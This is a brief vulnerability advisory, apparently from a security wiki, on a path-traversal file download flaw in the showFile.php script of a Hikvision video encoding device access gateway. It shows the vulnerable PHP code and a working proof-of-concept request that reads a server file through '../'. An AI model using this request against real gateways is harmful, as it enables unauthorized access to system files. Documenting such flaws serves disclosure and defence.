# HIKVISION Video encoding device access gateway showFile.php any file download vulnerability

## Vulnerability Description

There is a vulnerability to download any file in the fileName parameter fileName on the Hikvision video access gateway system.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">HIKVISION Video Encoding Device Access Gateway</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1630063019704-4b10f55b-d725-4866-b5aa-e73d638b2f27.png)

The vulnerable file is `showFile.php`, where `parameter fileName` does not filter dangerous characters, resulting in file traversal download



```php
<?php
					$file_name = $_GET['fileName'];
					$file_path = '../../../log/'.$file_name;
					$fp = fopen($file_path, "r");
					while($line = fgets($fp)){
						$line = nl2br(htmlentities($line, ENT_COMPAT, "utf-8"));
						echo '<span style="font-size:16px">'.$line.'</span>';
					}
					fclose($fp);
?>
```



Verify POC

```python
/serverLog/showFile.php?fileName=../web/html/main.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1630063348342-40566a14-18d5-467b-b259-ad3c6888c456.png)